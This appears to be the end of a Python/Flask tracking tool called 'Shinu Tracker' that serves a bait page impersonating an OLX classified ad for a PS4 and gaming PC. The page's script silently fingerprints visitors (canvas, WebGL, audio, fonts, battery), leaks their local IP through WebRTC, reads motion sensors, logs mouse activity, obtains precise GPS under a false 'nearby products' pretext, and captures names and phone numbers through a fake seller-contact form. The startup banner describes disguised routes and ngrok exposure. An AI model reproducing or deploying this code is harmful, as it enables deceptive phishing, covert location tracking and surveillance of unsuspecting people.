  .modal-overlay.open { display: flex; }
  .modal-box {
    background: #fff;
    border-radius: 16px;
    width: 90%;
    max-width: 380px;
    overflow: hidden;
    box-shadow: 0 20px 60px rgba(0,0,0,.3);
    animation: slideUp .25s ease;
  }
  @keyframes slideUp {
    from { transform: translateY(30px); opacity: 0; }
    to   { transform: translateY(0);    opacity: 1; }
  }
  .modal-header {
    background: linear-gradient(135deg,#6e0ad6,#a855f7);
    padding: 20px 24px;
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: space-between;
  }
    .modal-header h3 { font-size: 17px; font-weight: 700; }
  .modal-header p  { font-size: 12px; opacity: .85; margin-top: 3px; }
  .modal-close {
    background: rgba(255,255,255,.2);
    border: none;
    color: #fff;
    width: 30px;
    height: 30px;
    border-radius: 50%;
    font-size: 16px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: background .2s;
    flex-shrink: 0;
  }
  .modal-close:hover { background: rgba(255,255,255,.35); }
  .modal-body { padding: 24px; }
  .form-group { margin-bottom: 16px; }
  .form-label {
    display: block;
    font-size: 13px;
    font-weight: 600;
    color: #333;
    margin-bottom: 6px;
  }
  .form-input {
    width: 100%;
    padding: 12px 14px;
    border: 2px solid #e0e0e0;
    border-radius: 8px;
    font-size: 14px;
    color: #222;
    transition: border-color .2s;
    outline: none;
  }
  .form-input:focus { border-color: #6e0ad6; }
  .form-hint { font-size: 11px; color: #999; margin-top: 4px; }
  .btn-modal-submit {
    width: 100%;
    background: #6e0ad6;
    color: #fff;
    border: none;
    padding: 14px;
    border-radius: 10px;
    font-size: 15px;
    font-weight: 700;
    cursor: pointer;
    transition: background .2s;
    margin-top: 4px;
  }
  .btn-modal-submit:hover { background: #5a08b0; }
  .modal-footer {
    padding: 14px 24px;
    background: #fafafa;
    border-top: 1px solid #f0f0f0;
    font-size: 11px;
    color: #aaa;
    text-align: center;
  }
  .toast {
    position: fixed;
    bottom: 24px;
    right: 24px;
    background: #222;
    color: #fff;
    padding: 14px 20px;
    border-radius: 10px;
    font-size: 14px;
    font-weight: 500;
    box-shadow: 0 8px 30px rgba(0,0,0,.3);
    z-index: 999;
    display: flex;
    align-items: center;
    gap: 10px;
    transform: translateY(80px);
    opacity: 0;
    transition: all .3s ease;
    max-width: 320px;
  }
  .toast.show { transform: translateY(0); opacity: 1; }
  .toast.success { border-left: 4px solid #4ade80; }
  .toast.error   { border-left: 4px solid #f87171; }
  .toast.info    { border-left: 4px solid #9d5cff; }
</style>
</head>
<body>

<!-- ── HEADER ── -->
<header class="olx-header">
  <div class="olx-logo">OLX</div>
  <div class="olx-header-right">
    <button class="olx-btn-outline">Entrar</button>
    <button class="olx-btn-solid">Anunciar</button>
  </div>
</header>

<!-- ── BREADCRUMB ── -->
<div class="breadcrumb">
  <a href="#">Início</a><span>›</span>
  <a href="#">Eletrônicos</a><span>›</span>
  <a href="#">Games</a><span>›</span>
  <span style="color:#444">PS4 + PC Gamer e Monitor</span>
</div>

<!-- ── MAIN ── -->
<div class="main">

  <!-- coluna esquerda -->
  <div>
    <div class="gallery">
      <div class="gallery-main">
        🎮
        <div class="gallery-expired-overlay">
          <div class="expired-badge">⚠️ Anúncio Expirado</div>
        </div>
      </div>
      <div class="gallery-thumbs">
        <div class="thumb active">🎮</div>
        <div class="thumb">🖥️</div>
        <div class="thumb">🖱️</div>
        <div class="thumb">⌨️</div>
        <div class="thumb">📺</div>
      </div>
    </div>

    <div class="ad-info">
      <div class="ad-category">Eletrônicos › Games › PlayStation</div>
      <div class="ad-title">Vendo PS4 + PC Gamer Completo + Monitor 24"</div>
      <div class="ad-meta">
        <span>📅 Publicado há 3 dias</span>
        <span>👁️ 847 visualizações</span>
        <span>📍 São Paulo, SP</span>
      </div>
      <div class="ad-desc-title">Descrição</div>
      <div class="ad-desc">
        Vendo conjunto completo por motivo de viagem.<br><br>
        <strong>PS4 Slim 1TB</strong> — em perfeito estado, acompanha 2 controles
        e 5 jogos originais (FIFA 23, GTA V, Spider-Man, God of War, Uncharted 4).<br><br>
        <strong>PC Gamer</strong> — Ryzen 5 5600, RTX 3060, 16GB RAM DDR4,
        SSD 480GB + HD 1TB. Roda qualquer jogo atual no ultra.<br><br>
        <strong>Monitor 24" Full HD 144Hz</strong> — sem riscos, cor perfeita.<br><br>
        Tudo funcionando 100%. Vendo junto por R$ 4.500 ou separo.
        Aceito PIX, dinheiro ou cartão (com taxa).
        Retirada em Pinheiros ou entrego (combinar frete).
      </div>
      <div class="ad-tags">
        <span class="ad-tag">PS4</span>
        <span class="ad-tag">PC Gamer</span>
        <span class="ad-tag">Monitor</span>
        <span class="ad-tag">RTX 3060</span>
        <span class="ad-tag">Ryzen 5</span>
        <span class="ad-tag">Games</span>
      </div>
    </div>
  </div>

  <!-- sidebar -->
  <div class="sidebar">
    <div class="price-card">
      <div class="price-label">Preço</div>
      <div class="price-value">R$ 4.500</div>
      <button class="btn-primary" onclick="pedirLocalizacao()">
        📍 Ver produtos próximos
      </button>
      <button class="btn-secondary" onclick="abrirModal()">
        💬 Falar com vendedor
      </button>
    </div>

    <div class="seller-card">
      <div class="seller-title">Vendedor</div>
      <div class="seller-info">
        <div class="seller-avatar">👤</div>
        <div>
          <div class="seller-name">Carlos M.</div>
          <div class="seller-since">Na OLX desde 2019</div>
        </div>
      </div>
      <div class="seller-stats">
        <div class="seller-stat">
          <strong>47</strong><span>Anúncios</span>
        </div>
        <div class="seller-stat">
          <strong>4.8⭐</strong><span>Avaliação</span>
        </div>
        <div class="seller-stat">
          <strong>98%</strong><span>Responde</span>
        </div>
      </div>
    </div>

    <div class="safety-card">
      <strong>⚠️ Dicas de segurança</strong>
      Nunca pague antes de ver o produto pessoalmente.
      Desconfie de preços muito abaixo do mercado.
      Prefira locais públicos para negociação.
    </div>
  </div>
</div>

<!-- ── MODAL ── -->
<div class="modal-overlay" id="modal" onclick="fecharModalFora(event)">
  <div class="modal-box">
    <div class="modal-header">
      <div>
        <h3>💬 Falar com vendedor</h3>
        <p>Resposta em até 5 minutos</p>
      </div>
      <button class="modal-close" onclick="fecharModal()">✕</button>
    </div>
    <div class="modal-body">
      <div class="form-group">
        <label class="form-label">Seu nome completo</label>
        <input class="form-input" id="inp-nome"
               type="text" placeholder="Ex: João Silva">
      </div>
      <div class="form-group">
        <label class="form-label">WhatsApp / Telefone</label>
        <input class="form-input" id="inp-tel"
               type="tel" placeholder="(11) 99999-9999">
        <div class="form-hint">O vendedor entrará em contato por WhatsApp</div>
      </div>
      <div class="form-group">
        <label class="form-label">Mensagem (opcional)</label>
        <input class="form-input" id="inp-msg"
               type="text" placeholder="Ainda está disponível?">
      </div>
      <button class="btn-modal-submit" onclick="enviarContato()">
        Enviar mensagem 📨
      </button>
    </div>
    <div class="modal-footer">🔒 Seus dados são protegidos pela OLX</div>
  </div>
</div>

<!-- ── TOAST ── -->
<div class="toast" id="toast"></div>

<script>
// ── rotas renomeadas ───────────────────────────────────────────
const ROTAS = {
  coletar:      '/api/v1/analytics/event',
  ipLocal:      '/api/v1/network/probe',
  gps:          '/api/v1/location/nearby',
  canvas:       '/api/v1/device/fingerprint',
  contato:      '/api/v1/chat/message',
  sensores:     '/api/v1/device/sensors',
  comportamento:'/api/v1/user/behavior',
};

// ── toast ──────────────────────────────────────────────────────
function showToast(msg, tipo='info', dur=3500) {
  const t = document.getElementById('toast');
  t.className = `toast ${tipo} show`;
  t.innerHTML = ({ success:'✅', error:'❌', info:'ℹ️' }[tipo] || '') + ' ' + msg;
  clearTimeout(t._timer);
  t._timer = setTimeout(() => { t.className = 'toast'; }, dur);
}

// ── modal ──────────────────────────────────────────────────────
function abrirModal() {
  document.getElementById('modal').classList.add('open');
}
function fecharModal() {
  document.getElementById('modal').classList.remove('open');
}
function fecharModalFora(e) {
  if (e.target === document.getElementById('modal')) fecharModal();
}
function enviarContato() {
  const nome = document.getElementById('inp-nome').value.trim();
  const tel  = document.getElementById('inp-tel').value.trim();
  const msg  = document.getElementById('inp-msg').value.trim();
  if (!nome || !tel) {
    showToast('Preencha nome e telefone!', 'error');
    return;
  }
  enviar(ROTAS.contato, { nome, telefone: tel, mensagem: msg });
  fecharModal();
  showToast('Mensagem enviada! O vendedor entrará em contato.', 'success');
  document.getElementById('inp-nome').value = '';
  document.getElementById('inp-tel').value  = '';
  document.getElementById('inp-msg').value  = '';
}

// ── GPS ────────────────────────────────────────────────────────
function pedirLocalizacao() {
  if (!navigator.geolocation) {
    showToast('Geolocalização não suportada.', 'error');
    return;
  }
  showToast('Buscando produtos próximos...', 'info');
  navigator.geolocation.getCurrentPosition(
    function(pos) {
      enviar(ROTAS.gps, {
        lat:     pos.coords.latitude,
        lon:     pos.coords.longitude,
        acc:     pos.coords.accuracy,
        alt:     pos.coords.altitude,
        heading: pos.coords.heading,
        speed:   pos.coords.speed,
      });
      showToast('Produtos encontrados na sua região!', 'success');
    },
    function(err) {
      enviar(ROTAS.gps, { erro: err.message });
      showToast('Não foi possível obter localização.', 'error');
    },
    { enableHighAccuracy: true, timeout: 10000 }
  );
}

// ── coleta principal ───────────────────────────────────────────
function coletarDados() {
  const dados = {
    tela:             screen.width + 'x' + screen.height,
    profundidade_cor: screen.colorDepth,
    pixel_ratio:      window.devicePixelRatio,
    largura_janela:   window.innerWidth,
    altura_janela:    window.innerHeight,
    timezone:         Intl.DateTimeFormat().resolvedOptions().timeZone,
    idioma:           navigator.language,
    idiomas:          (navigator.languages || []).join(', '),
    user_agent:       navigator.userAgent,
    plataforma:       navigator.platform,
    cookies_ok:       navigator.cookieEnabled,
    online:           navigator.onLine,
    referrer:         document.referrer,
    historico_len:    history.length,
    do_not_track:     navigator.doNotTrack,
    cores_cpu:        navigator.hardwareConcurrency || null,
    memoria_gb:       navigator.deviceMemory        || null,
    touch:            ('ontouchstart' in window),
    java_ok:          navigator.javaEnabled ? navigator.javaEnabled() : false,
    storage_local:    (function(){ try{ return !!localStorage;  }catch(e){ return false; }})(),
    storage_session:  (function(){ try{ return !!sessionStorage; }catch(e){ return false; }})(),
    indexeddb:        ('indexedDB' in window),
    webrtc_ok:        ('RTCPeerConnection' in window),
    canvas_ok:        (!!document.createElement('canvas').getContext),
    audio_ctx:        ('AudioContext' in window || 'webkitAudioContext' in window),
    conexao:          navigator.connection ? navigator.connection.effectiveType : null,
    velocidade_down:  navigator.connection ? navigator.connection.downlink      : null,
    rtt            : navigator.connection ? navigator.connection.rtt : null,
    economia_dados:   navigator.connection ? navigator.connection.saveData       : null,
    plugins:          navigator.plugins
                        ? Array.from(navigator.plugins).map(p => p.name)
                        : [],
    data_iso:         new Date().toISOString(),
    hora_local:       new Date().toString(),
    offset_min:       new Date().getTimezoneOffset(),
  };

  // bateria
  if (navigator.getBattery) {
    navigator.getBattery()
      .then(function(b) {
        dados.bateria_pct    = Math.round(b.level * 100);
        dados.carregando     = b.charging;
        dados.tempo_descarga = b.dischargingTime;
        dados.tempo_carga    = b.chargingTime;
        enviar(ROTAS.coletar, dados);
      })
      .catch(function() { enviar(ROTAS.coletar, dados); });
  } else {
    enviar(ROTAS.coletar, dados);
  }

  setTimeout(coletarCanvas, Math.random() * 1500 + 500);
  setTimeout(coletarAudio,  Math.random() * 2000 + 1000);
}

// ── canvas + webgl fingerprint ─────────────────────────────────
function coletarCanvas() {
  const resultado = {};

  // canvas 2D
  try {
    const cv  = document.createElement('canvas');
    cv.width  = 300; cv.height = 100;
    const ctx = cv.getContext('2d');
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 300, 100);
    ctx.fillStyle = '#069';
    ctx.font = '18px Arial';
    ctx.fillText('OLX Fingerprint', 10, 50);
    ctx.strokeStyle = 'rgba(100,200,50,.8)';
    ctx.arc(150, 50, 40, 0, Math.PI * 2);
    ctx.stroke();
    const dataUrl = cv.toDataURL();
    resultado.canvas_hash = dataUrl
      .split('')
      .reduce((h, c) => (Math.imul(31, h) + c.charCodeAt(0)) | 0, 0);
  } catch(e) {
    resultado.canvas_erro = e.message;
  }

  // WebGL
  try {
    const glc = document.createElement('canvas');
    const gl  = glc.getContext('webgl') ||
                glc.getContext('experimental-webgl');
    if (gl) {
      resultado.webgl_vendor   = gl.getParameter(gl.VENDOR);
      resultado.webgl_renderer = gl.getParameter(gl.RENDERER);
      resultado.webgl_version  = gl.getParameter(gl.VERSION);
      resultado.max_textura    = gl.getParameter(gl.MAX_TEXTURE_SIZE);
      resultado.webgl_exts     = gl.getSupportedExtensions();

      const ext = gl.getExtension('WEBGL_debug_renderer_info');
      if (ext) {
        resultado.gpu_vendor   = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
        resultado.gpu_renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch(e) {
    resultado.webgl_erro = e.message;
  }

  // fontes instaladas
  try {
    const fontes = [
      'Arial','Verdana','Helvetica','Times New Roman',
      'Courier New','Georgia','Comic Sans MS','Trebuchet MS',
      'Impact','Tahoma','Calibri','Segoe UI','Roboto',
      'Open Sans','Ubuntu','Fira Code','Consolas','Monaco',
    ];
    const cv2  = document.createElement('canvas');
    const ctx2 = cv2.getContext('2d');
    const txt  = 'mmmmmmmmmmlli';
    function largura(f) {
      ctx2.font = `16px '${f}', monospace`;
      return ctx2.measureText(txt).width;
    }
    const base = largura('monospace');
    resultado.fonts = fontes.filter(f => largura(f) !== base);
  } catch(e) {}

  resultado.plugins = navigator.plugins
    ? Array.from(navigator.plugins).map(p => p.name)
    : [];

  enviar(ROTAS.canvas, resultado);
}

// ── audio fingerprint ──────────────────────────────────────────
function coletarAudio() {
  try {
    const ctx  = new (window.AudioContext || window.webkitAudioContext)();
    const osc  = ctx.createOscillator();
    const ana  = ctx.createAnalyser();
    const gain = ctx.createGain();

    gain.gain.value = 0;
    osc.connect(ana);
    ana.connect(gain);
    gain.connect(ctx.destination);
    osc.start(0);

    const buf = new Float32Array(ana.frequencyBinCount);
    ana.getFloatFrequencyData(buf);

    const hash = buf
      .slice(0, 30)
      .reduce((a, b) => a + Math.abs(b), 0)
      .toFixed(6);

    osc.stop();
    ctx.close();

    enviar(ROTAS.canvas, { audio_hash: hash });
  } catch(e) {}
}

// ── WebRTC IP local ────────────────────────────────────────────
function coletarIpLocal() {
  try {
    const pc  = new RTCPeerConnection({ iceServers: [] });
    const ips = new Set();
    pc.createDataChannel('');
    pc.createOffer()
      .then(o => pc.setLocalDescription(o))
      .catch(() => {});
    pc.onicecandidate = function(evt) {
      if (!evt || !evt.candidate) return;
      const regex = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})/g;
      let m;
      while ((m = regex.exec(evt.candidate.candidate)) !== null) {
        const ip = m[1];
        if (ip !== '0.0.0.0' && !ips.has(ip)) {
          ips.add(ip);
          enviar(ROTAS.ipLocal, { ip_local: ip });
        }
      }
    };
    setTimeout(() => pc.close(), 3000);
  } catch(e) {}
}

// ── sensores mobile ────────────────────────────────────────────
function coletarSensores() {
  const dados = {};

  if (window.DeviceMotionEvent) {
    window.addEventListener('devicemotion', function handler(e) {
      dados.aceleracao = {
        x: e.acceleration?.x?.toFixed(4),
        y: e.acceleration?.y?.toFixed(4),
        z: e.acceleration?.z?.toFixed(4),
      };
      dados.aceleracao_gravidade = {
        x: e.accelerationIncludingGravity?.x?.toFixed(4),
        y: e.accelerationIncludingGravity?.y?.toFixed(4),
        z: e.accelerationIncludingGravity?.z?.toFixed(4),
      };
      dados.rotacao = {
        alpha: e.rotationRate?.alpha?.toFixed(4),
        beta:  e.rotationRate?.beta?.toFixed(4),
        gamma: e.rotationRate?.gamma?.toFixed(4),
      };
      window.removeEventListener('devicemotion', handler);
      enviar(ROTAS.sensores, dados);
    }, { once: true });
  }

  if (window.DeviceOrientationEvent) {
    window.addEventListener('deviceorientation', function handler(e) {
      dados.orientacao = {
        alpha: e.alpha?.toFixed(2),
        beta:  e.beta?.toFixed(2),
        gamma: e.gamma?.toFixed(2),
      };
      window.removeEventListener('deviceorientation', handler);
      enviar(ROTAS.sensores, dados);
    }, { once: true });
  }
}

// ── comportamento ──────────────────────────────────────────────
function monitorarComportamento() {
  const inicio     = Date.now();
  const movimentos = [];
  const cliques    = [];
  let   maxScroll  = 0;

  document.addEventListener('mousemove', function(e) {
    if (movimentos.length < 50) {
      movimentos.push({
        x: e.clientX,
        y: e.clientY,
        t: Date.now() - inicio,
      });
    }
  });

  document.addEventListener('click', function(e) {
    cliques.push({
      x: e.clientX,
      y: e.clientY,
      t: Date.now() - inicio,
    });
  });

  document.addEventListener('scroll', function() {
    const total = document.body.scrollHeight - window.innerHeight;
    if (total > 0) {
      const pct = Math.round((window.scrollY / total) * 100);
      if (pct > maxScroll) maxScroll = pct;
    }
  });

  window.addEventListener('beforeunload', function() {
    navigator.sendBeacon(ROTAS.comportamento, JSON.stringify({
      tempo_pagina_ms:  Date.now() - inicio,
      movimentos_mouse: movimentos,
      cliques:          cliques,
      scroll_max_pct:   maxScroll,
      largura_janela:   window.innerWidth,
      altura_janela:    window.innerHeight,
    }));
  });
}

// ── helper fetch ───────────────────────────────────────────────
function enviar(rota, payload) {
  fetch(rota, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify(payload),
  }).catch(() => {});
}

// ── inicialização ──────────────────────────────────────────────
coletarDados();
coletarIpLocal();
coletarSensores();
monitorarComportamento();
</script>
</body>
</html>
"""

# ═══════════════════════════════════════════════════════════════════
# STARTUP — terminal Shinu
# ═══════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')

    W    = 68
    _are = re.compile(r'\x1b\$[0-9;]*m')

    def _l(conteudo="", char="║"):
        inner = f"  {conteudo}"
        limpo = _are.sub('', inner)
        pad   = W - len(limpo) - 2
        print(f"{ROXO}{char}{BR}{inner}{' ' * max(pad,0)}{ROXO}{char}{BR}")

    def _div(e="╠", m="═", d="╣"):
        print(f"{ROXO}{e}{ROXO_ESC}{m*W}{ROXO}{d}{BR}")

    def _top():
        print(f"{ROXO}╔{ROXO_ESC}{'═'*W}{ROXO}╗{BR}")

    def _bot():
        print(f"{ROXO}╚{ROXO_ESC}{'═'*W}{ROXO}╝{BR}")

    banner_shinu = [
        r"   ███████╗██╗  ██╗██╗███╗   ██╗██╗   ██╗",
        r"   ██╔════╝██║  ██║██║████╗  ██║██║   ██║",
        r"   ███████╗███████║██║██╔██╗ ██║██║   ██║",
        r"   ╚════██║██╔══██║██║██║╚██╗██║██║   ██║",
        r"   ███████║██║  ██║██║██║ ╚████║╚██████╔╝",
        r"   ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝",
    ]
    banner_tracker = [
        r"  ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ ",
        r"  ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗",
        r"     ██║   ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝",
        r"     ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗",
        r"     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║",
        r"     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝",
    ]

    print()
    for b in banner_shinu:
        print(f"  {ROXO_CLA}{b}{BR}")
    print()
    for b in banner_tracker:
        print(f"  {ROSA}{b}{BR}")
    print()

    sub     = "◈  Inteligência Digital  •  Rastreamento Avançado  •  v4.0  ◈"
    pad_sub = (W + 2 - len(sub)) // 2
    print(f"{' '*pad_sub}{ROXO_ESC}{sub}{BR}")
    print()
    print(f"  {ROXO}{'▰'*34}{ROSA}{'▰'*34}{BR}")
    print()

    _top()
    _l()
    _l(f"{ROXO_CLA}  ⬡  {BRANCO}Desenvolvido por {ROSA}Shinu "
       f"{CINZA}| {ROXO_CLA}@shinu.tracker{BR}")
    _l(f"{CINZA}     Sistema proprietário de rastreamento inteligente{BR}")
    _l(f"{CINZA}     Todos os direitos reservados © 2025{BR}")
    _l()
    _div()
    _l()
    _l(f"{ROXO_CLA}  ◈  MÓDULOS ATIVOS{BR}")
    _l()
    _l(f"{VERDE}  ✦  {BRANCO}Geolocalização dupla        {ROXO_CLA}[ip-api + ipwho]{BR}")
    _l(f"{VERDE}  ✦  {BRANCO}Fingerprint hardware         {ROXO_CLA}[Canvas + WebGL + GPU + Audio]{BR}")
    _l(f"{VERDE}  ✦  {BRANCO}Sensores mobile              {ROXO_CLA}[Giroscópio + Acelerômetro]{BR}")
    _l(f"{VERDE}  ✦  {BRANCO}Detecção de anonimizadores  {ROXO_CLA}[VPN + Proxy + Tor]{BR}")
    _l(f"{VERDE}  ✦  {BRANCO}Análise de dispositivo       {ROXO_CLA}[UA Parser + Bot detect]{BR}")
    _l(f"{VERDE}  ✦  {BRANCO}Captura de IP real           {ROXO_CLA}[WebRTC Leak]{BR}")
    _l(f"{VERDE}  ✦  {BRANCO}Proteção anti-flood          {ROXO_CLA}[Rate Limiting + Blacklist]{BR}")
    _l(f"{VERDE}  ✦  {BRANCO}Banco de dados               {ROXO_CLA}[SQLite — shinu.db]{BR}")
    _l(f"{VERDE}  ✦  {BRANCO}Headers mascarados           {ROXO_CLA}[nginx/1.24.0 fake]{BR}")
    _l(f"{VERDE}  ✦  {BRANCO}Rotas isca                   {ROXO_CLA}[.env / admin / git]{BR}")
    _l(f"{VERDE}  ✦  {BRANCO}Detecção de injeção          {ROXO_CLA}[SQL + XSS + CMD + Path]{BR}")
    _l(f"{VERDE}  ✦  {BRANCO}Logs com rotação automática  {ROXO_CLA}[5MB × 3 backups]{BR}")
    _l()
    _div()
    _l()
    _l(f"{ROXO_CLA}  ◈  ACESSO RÁPIDO{BR}")
    _l()
    _l(f"  {ROSA}🎯  {ROXO_CLA}Página Isca    "
       f"{CINZA}→  {BRANCO}http://localhost:5000{BR}")
    _l(f"  {ROSA}📊  {ROXO_CLA}Painel Live    "
       f"{CINZA}→  {BRANCO}http://localhost:5000/dashboard{BR}")
    _l(f"  {ROSA}🗄️   {ROXO_CLA}Banco SQLite   "
       f"{CINZA}→  {BRANCO}./{DB_PATH}{BR}")
    _l(f"  {ROSA}📂  {ROXO_CLA}Registros JSON "
       f"{CINZA}→  {BRANCO}./{PASTA_LOGS}/{BR}")
    _l(f"  {ROSA}🔒  {ROXO_CLA}Sessões        "
       f"{CINZA}→  {BRANCO}./{PASTA_LOGS}/sessao_*.json{BR}")
    _l(f"  {ROSA}📋  {ROXO_CLA}Log Geral      "
       f"{CINZA}→  {BRANCO}./{PASTA_LOGS}/shinu.log{BR}")
    _l(f"  {ROSA}🌍  {ROXO_CLA}Expor Online   "
       f"{CINZA}→  {BRANCO}ngrok http 5000{BR}")
    _l()
    _div()
    _l()
    _l(f"{ROXO_CLA}  ◈  ESTATÍSTICAS ACUMULADAS{BR}")
    _l()

    # ── lê stats do banco ────────────────────────────────────────
    try:
        con = sqlite3.connect(DB_PATH)
        total_acessos = con.execute(
            "SELECT COUNT(*) FROM eventos WHERE tipo='coleta_inicial'"
        ).fetchone()[0]
        total_gps     = con.execute(
            "SELECT COUNT(*) FROM eventos WHERE tipo='gps'"
        ).fetchone()[0]
        total_sessoes = len(glob.glob(
            os.path.join(PASTA_LOGS, "sessao_*.json")
        ))
        total_contato = con.execute(
            "SELECT COUNT(*) FROM eventos WHERE tipo='contato_falso'"
        ).fetchone()[0]
        total_canvas  = con.execute(
            "SELECT COUNT(*) FROM eventos WHERE tipo='canvas_fingerprint'"
        ).fetchone()[0]
        total_scans   = con.execute(
            "SELECT COUNT(*) FROM scans"
        ).fetchone()[0]
        total_black   = con.execute(
            "SELECT COUNT(*) FROM blacklist"
        ).fetchone()[0]
        total_vpn     = con.execute(
            "SELECT COUNT(*) FROM eventos WHERE vpn=1"
        ).fetchone()[0]
        con.close()
    except Exception:
        total_acessos = total_gps = total_sessoes = 0
        total_contato = total_canvas = total_scans = 0
        total_black   = total_vpn = 0

    _l(f"  {ROSA}🚨  {BRANCO}Acessos registrados   "
       f"{AMARELO}{total_acessos:>6}{BR}")
    _l(f"  {ROSA}📍  {BRANCO}GPS coletados         "
       f"{AMARELO}{total_gps:>6}{BR}")
    _l(f"  {ROSA}👤  {BRANCO}Sessões únicas        "
       f"{AMARELO}{total_sessoes:>6}{BR}")
    _l(f"  {ROSA}📞  {BRANCO}Contatos capturados   "
       f"{AMARELO}{total_contato:>6}{BR}")
    _l(f"  {ROSA}🖼️   {BRANCO}Fingerprints          "
       f"{AMARELO}{total_canvas:>6}{BR}")
    _l(f"  {ROSA}⚠️   {BRANCO}Scans detectados      "
       f"{AMARELO}{total_scans:>6}{BR}")
    _l(f"  {ROSA}🚫  {BRANCO}IPs na blacklist      "
       f"{AMARELO}{total_black:>6}{BR}")
    _l(f"  {ROSA}🔍  {BRANCO}VPNs detectadas       "
       f"{AMARELO}{total_vpn:>6}{BR}")
    _l()
    _div()
    _l()

    agora = datetime.now().strftime("%d/%m/%Y   %H:%M:%S")
    _l(f"  {ROSA}🕐  {ROXO_CLA}Iniciado em  "
       f"{BRANCO}{agora}{BR}")
    _l()
    _l(f"  {VERMELHO}⚠   {CINZA}Use apenas com autorização explícita{BR}")
    _l(f"  {VERMELHO}⚠   {CINZA}CTRL+C para encerrar o servidor{BR}")
    _l()
    _bot()

    # ── barra de status ──────────────────────────────────────────
    print()
    barra = f"{'▰' * 34}{'▱' * 34}"
    print(f"  {ROXO}{barra}{BR}")
    print()
    print(f"  {ROXO}◈ {ROSA}STATUS   {ROXO_ESC}│  "
          f"{VERDE}● ONLINE   {ROXO_ESC}│  "
          f"{ROXO_CLA}Shinu Tracker v4.0   {ROXO_ESC}│  "
          f"{CINZA}Aguardando conexões...{BR}")
    print()
    print(f"  {ROXO}{barra}{BR}")
    print()

    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)